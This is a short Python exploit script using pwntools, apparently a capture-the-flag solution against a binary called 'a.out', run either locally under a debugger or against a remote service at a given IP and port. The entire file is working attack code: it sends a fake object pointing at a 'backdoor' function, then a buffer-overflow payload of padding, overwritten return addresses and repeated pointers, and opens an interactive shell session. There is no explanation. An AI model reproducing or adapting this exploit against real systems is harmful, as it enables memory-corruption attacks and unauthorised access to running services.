from pwn import *
import time

if args.LOCAL:
    io=process('./a.out')
    if args.GDB:
        cmd="""
        init-pwndbg
        b* 0x404056
        b* 0x4025e6
        """
        gdb.attach(io, gdbscript=cmd)
else:
    io=remote('43.132.193.22', 9999)

elf=context.binary=ELF('./a.out')
context.log_level='debug'
backdoor=0x402263
pl=p64(0x4eb0c0) +p64(backdoor)# fake obj
pause()
io.send(pl+(64-len(pl))*b'\0')
sleep(1)

# pl=96*'A
pl=b'A'*96+p64(0x4022de)*2+p64(0x4eb0c0)*100
pause()

sleep(1)
io.sendline(pl)
sleep(1)
io.interactive()